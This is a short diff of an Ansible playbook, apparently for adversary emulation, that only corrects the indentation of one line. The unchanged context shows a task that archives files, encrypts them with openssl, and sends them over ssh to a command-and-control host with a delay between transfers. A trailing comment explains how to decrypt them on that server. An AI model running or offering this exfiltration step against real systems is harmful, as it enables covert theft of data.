@@ -26,7 +26,7 @@
       shell: |
         "tar czpf - {{ item }} | openssl des3 -salt -k {{ password_encryption }} | ssh {{ cnc_fqdn }} 'cat > {{ exfiltration_file }}-{{ item }}.tar.gz.enc'"
         "sleep {{ exfil_delay }}"
-       args:
+      args:
         chdir: "{{ exfiltration_folder }}"
       with_items: "{{ exfil_files.stdout_lines }}"
 # decrypt file on cnc: openssl des3 -d -salt -k {{ password_encryption }} -in {{ exfiltration_file }}.tar.gz.enc -out {{ exfiltration_file }}tar.gz    
